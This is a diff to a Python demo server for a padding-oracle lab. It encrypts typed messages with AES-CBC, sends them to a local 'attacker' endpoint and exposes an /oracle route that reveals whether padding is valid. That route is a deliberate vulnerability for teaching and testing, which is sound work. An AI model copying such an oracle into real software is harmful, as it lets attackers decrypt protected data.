@@ -1,152 +1,46 @@
 #!/usr/bin/env python3
 """
-Sender / Encryption Server  (port 5000)
+Encryption Server + Padding Oracle  (Terminal 1)
 
-- Web UI to type a plaintext message
-- Encrypts with AES-CBC and sends ciphertext to the attacker/receiver
-- Exposes /oracle endpoint (the vulnerability) that only says valid/invalid padding
+Run this in one terminal. Type plaintext messages, they get encrypted
+with AES-128-CBC + PKCS#7 padding and sent to the attacker.
+
+Flask runs silently in the background on port 5000 to serve /oracle requests.
 """
 
 import os
-from flask import Flask, request, jsonify, render_template_string
+import sys
+import threading
+import logging
+from flask import Flask, request, jsonify
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 import requests as http_req
 
+# ──────────────────────────────────────────────
+# HARDCODED / CONFIGURABLE VALUES
+# ──────────────────────────────────────────────
+BLOCK_SIZE   = 16          # AES block size (128 bits) — fixed by AES spec
+KEY_SIZE     = 16          # AES-128 = 16 bytes, AES-192 = 24, AES-256 = 32
+KEY          = os.urandom(KEY_SIZE)   # random key, generated fresh each run
+PADDING      = "PKCS#7"   # padding standard used
+SERVER_PORT  = 5000        # port this server listens on
+ATTACKER_URL = "http://127.0.0.1:5001/capture"  # where to send ciphertext
+# ──────────────────────────────────────────────
+
+oracle_queries = 0
+
 app = Flask(__name__)
-
-KEY = os.urandom(16)
-BLOCK_SIZE = 16
-ATTACKER_URL = "http://127.0.0.1:5001/capture"
-
-PAGE = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Secure Messenger</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    font-family: 'Segoe UI', system-ui, sans-serif;
-    background: #0f172a; color: #e2e8f0;
-    min-height: 100vh; display: flex; justify-content: center; padding: 40px 20px;
-  }
-  .card {
-    background: #1e293b; border-radius: 16px; padding: 40px;
-    max-width: 660px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,.4);
-  }
-  h1 { font-size: 1.6rem; margin-bottom: 6px; color: #38bdf8; }
-  .sub { color: #94a3b8; margin-bottom: 28px; font-size: .9rem; }
-  textarea {
-    width: 100%; height: 120px; padding: 14px; border-radius: 10px;
-    border: 1px solid #334155; background: #0f172a; color: #f1f5f9;
-    font-size: 1rem; resize: vertical; outline: none;
-  }
-  textarea:focus { border-color: #38bdf8; }
-  button {
-    margin-top: 16px; padding: 12px 32px; border: none; border-radius: 10px;
-    background: #2563eb; color: #fff; font-size: 1rem; cursor: pointer;
-    transition: background .2s;
-  }
-  button:hover { background: #1d4ed8; }
-  button:disabled { background: #334155; cursor: not-allowed; }
-  .log { margin-top: 28px; }
-  .entry {
-    background: #0f172a; border-radius: 10px; padding: 16px; margin-bottom: 12px;
-    border-left: 4px solid #22c55e; word-break: break-all; font-size: .85rem;
-  }
-  .entry .label { color: #94a3b8; font-size: .75rem; margin-bottom: 4px; }
-  .entry .hex { font-family: 'Courier New', monospace; color: #34d399; }
-  .entry .plain { color: #fbbf24; }
-</style>
-</head>
-<body>
-<div class="card">
-  <h1>Secure Messenger - Sender</h1>
-  <p class="sub">AES-128-CBC encryption. Type a message and send it to the receiver.</p>
-  <textarea id="msg" placeholder="Type your secret message here..."></textarea>
-  <button id="btn" onclick="send()">Encrypt &amp; Send</button>
-  <div class="log" id="log"></div>
-</div>
-<script>
-async function send() {
-  const btn = document.getElementById('btn');
-  const msg = document.getElementById('msg').value.trim();
-  if (!msg) return;
-  btn.disabled = true; btn.textContent = 'Sending...';
-  try {
-    const r = await fetch('/send', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({message: msg})
-    });
-    const d = await r.json();
-    const log = document.getElementById('log');
-    log.innerHTML = `
-      <div class="entry">
-        <div class="label">PLAINTEXT</div>
-        <div class="plain">${msg}</div>
-      </div>
-      <div class="entry">
-        <div class="label">IV (hex)</div>
-        <div class="hex">${d.iv}</div>
-      </div>
-      <div class="entry">
-        <div class="label">CIPHERTEXT (hex)</div>
-        <div class="hex">${d.ciphertext}</div>
-      </div>
-      <div class="entry" style="border-color:#2563eb">
-        <div class="label">STATUS</div>
-        <div>${d.delivered ? 'Delivered to receiver' : 'Receiver not reachable (ciphertext still created)'}</div>
-      </div>
-    ` + log.innerHTML;
-    document.getElementById('msg').value = '';
-  } catch(e) { alert('Error: ' + e); }
-  btn.disabled = false; btn.textContent = 'Encrypt & Send';
-}
-</script>
-</body>
-</html>
-"""
-
-
-@app.route("/")
-def index():
-    return render_template_string(PAGE)
-
-
-@app.route("/send", methods=["POST"])
-def send_message():
-    data = request.get_json(force=True)
-    plaintext = data.get("message", "")
-    if not plaintext:
-        return jsonify({"error": "empty message"}), 400
-
-    iv = os.urandom(BLOCK_SIZE)
-    cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
-    ct = cipher.encrypt(pad(plaintext.encode(), BLOCK_SIZE))
-
-    full_hex = (iv + ct).hex()
-
-    delivered = False
-    try:
-        http_req.post(ATTACKER_URL, json={"ciphertext": full_hex}, timeout=3)
-        delivered = True
-    except Exception:
-        pass
-
-    return jsonify({
-        "iv": iv.hex(),
-        "ciphertext": ct.hex(),
-        "full_hex": full_hex,
-        "delivered": delivered,
-    })
+log = logging.getLogger("werkzeug")
+log.setLevel(logging.ERROR)
 
 
 @app.route("/oracle", methods=["POST"])
 def oracle():
-    """The vulnerability: tells if PKCS#7 padding is valid after decryption."""
+    """Only answers: is the PKCS#7 padding valid? True or False."""
+    global oracle_queries
+    oracle_queries += 1
+
     data = request.get_json(force=True)
     ct_hex = data.get("ciphertext", "")
 
@@ -162,8 +56,8 @@ def oracle():
     ct_part = ct_bytes[BLOCK_SIZE:]
 
     try:
-        dec = AES.new(KEY, AES.MODE_CBC, iv=iv_part)
-        pt = dec.decrypt(ct_part)
+        cipher = AES.new(KEY, AES.MODE_CBC, iv=iv_part)
+        pt = cipher.decrypt(ct_part)
         pad_byte = pt[-1]
         if pad_byte < 1 or pad_byte > BLOCK_SIZE:
             return jsonify({"valid": False})
@@ -174,7 +68,88 @@ def oracle():
     return jsonify({"valid": valid})
 
 
+def start_flask():
+    app.run(host="127.0.0.1", port=SERVER_PORT, threaded=True)
+
+
+def print_config():
+    print("=" * 55)
+    print("  ENCRYPTION SERVER  (Padding Oracle)")
+    print("=" * 55)
+    print()
+    print("  Hardcoded values:")
+    print(f"    Algorithm    : AES-{KEY_SIZE * 8}-CBC")
+    print(f"    Block size   : {BLOCK_SIZE} bytes ({BLOCK_SIZE * 8} bits)")
+    print(f"    Key size     : {KEY_SIZE} bytes ({KEY_SIZE * 8} bits)")
+    print(f"    Padding      : {PADDING}")
+    print(f"    Key (hex)    : {KEY.hex()}")
+    print(f"    Server port  : {SERVER_PORT}")
+    print(f"    Attacker URL : {ATTACKER_URL}")
+    print()
+    print("  The /oracle endpoint only reveals if padding is valid.")
+    print("  The attacker never sees the key.")
+    print("-" * 55)
+    print()
+
+
+def main():
+    print_config()
+
+    flask_thread = threading.Thread(target=start_flask, daemon=True)
+    flask_thread.start()
+    print(f"  [OK] Oracle listening on port {SERVER_PORT}\n")
+
+    while True:
+        try:
+            plaintext = input("  Enter message (or 'quit'): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print("\n  [*] Input ended. Oracle stays alive (Ctrl+C to stop).")
+            # Keep the oracle running so the attacker can still query it
+            try:
+                flask_thread.join()
+            except KeyboardInterrupt:
+                pass
+            print("  Bye.")
+            return
+
+        if not plaintext:
+            continue
+        if plaintext.lower() == "quit":
+            print("  Bye.")
+            break
+
+        pt_bytes = plaintext.encode()
+        iv = os.urandom(BLOCK_SIZE)
+        cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
+        ct = cipher.encrypt(pad(pt_bytes, BLOCK_SIZE))
+
+        padded_len = len(pad(pt_bytes, BLOCK_SIZE))
+        pad_bytes_added = padded_len - len(pt_bytes)
+
+        print()
+        print(f"  Plaintext      : {plaintext}")
+        print(f"  Plaintext bytes: {len(pt_bytes)}")
+        print(f"  PKCS#7 padding : {pad_bytes_added} bytes of value 0x{pad_bytes_added:02x}")
+        print(f"  Padded length  : {padded_len} bytes ({padded_len // BLOCK_SIZE} blocks)")
+        print(f"  IV       (hex) : {iv.hex()}")
+        print(f"  CT       (hex) : {ct.hex()}")
+        print(f"  Full IV+CT     : {(iv + ct).hex()}")
+
+        delivered = False
+        try:
+            http_req.post(
+                ATTACKER_URL,
+                json={"ciphertext": (iv + ct).hex()},
+                timeout=3,
+            )
+            delivered = True
+        except Exception:
+            pass
+
+        status = "SENT to attacker" if delivered else "FAILED (attacker not running?)"
+        print(f"  Status         : {status}")
+        print()
+
+
 if __name__ == "__main__":
-    print("\n  Sender Server running on http://127.0.0.1:5000")
-    print("  Oracle endpoint: POST http://127.0.0.1:5000/oracle\n")
-    app.run(host="127.0.0.1", port=5000, threaded=True)
+    main()
